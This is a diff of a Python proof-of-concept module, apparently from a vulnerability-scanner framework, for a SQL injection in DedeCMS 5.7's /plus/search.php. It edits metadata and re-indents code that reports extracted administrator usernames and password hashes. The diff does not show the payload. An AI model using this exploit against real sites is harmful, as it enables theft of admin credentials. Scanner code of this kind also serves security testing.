@@ -6,18 +6,18 @@ import urllib,urllib2
 import re
 
 class Vuln(ABVuln):
-    vuln_id = 'dedecms_0005_p_bb2' # 平台漏洞编号，留空
-    name = 'Dedecms 5.7 /plus/search.php SQL注入漏洞' # 漏洞名称
+    vuln_id = 'DedeCMS_0010' # 平台漏洞编号，留空
+    name = '织梦CMS /plus/search.php SQL注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = 'http://www.cnblogs.com/LittleHann/p/4505694.html'  # 漏洞公布时间
+    disclosure_date = '2013-01-16'  # 漏洞公布时间
     desc = '''
-        Dedecms 5.7 /plus/search.php SQL注入漏洞
+        DedeCMS 5.7 /plus/search.php $typeArr的本地变量覆盖注入 +$typeid变量覆盖，导致SQL注入SQL注入漏洞。
     ''' # 漏洞描述
     ref = 'http://www.cnblogs.com/LittleHann/p/4505694.html' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
-    product = 'dedecms'  # 漏洞应用名称
+    cnvd_id = 'Unknown' # cnvd漏洞编号
+    cve_id = 'Unknown' #cve编号
+    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = '5.7'  # 漏洞应用版本
 
 
@@ -72,10 +72,10 @@ class Poc(ABPoc):
                 admin_info_duplicate = sorted(set(admin_info),key=admin_info.index)
                 if len(admin_info_duplicate) >0 :
                     for info in admin_info_duplicate:
-                       info_list = info.split("|")
-                       info_name = info_list[0]
-                       info_pwd = info_list[1][3:19]  
-                       self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,username=info_name,password=info_pwd))
+                        info_list = info.split("|")
+                        info_name = info_list[0]
+                        info_pwd = info_list[1][3:19]  
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,username=info_name,password=info_pwd))
         
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
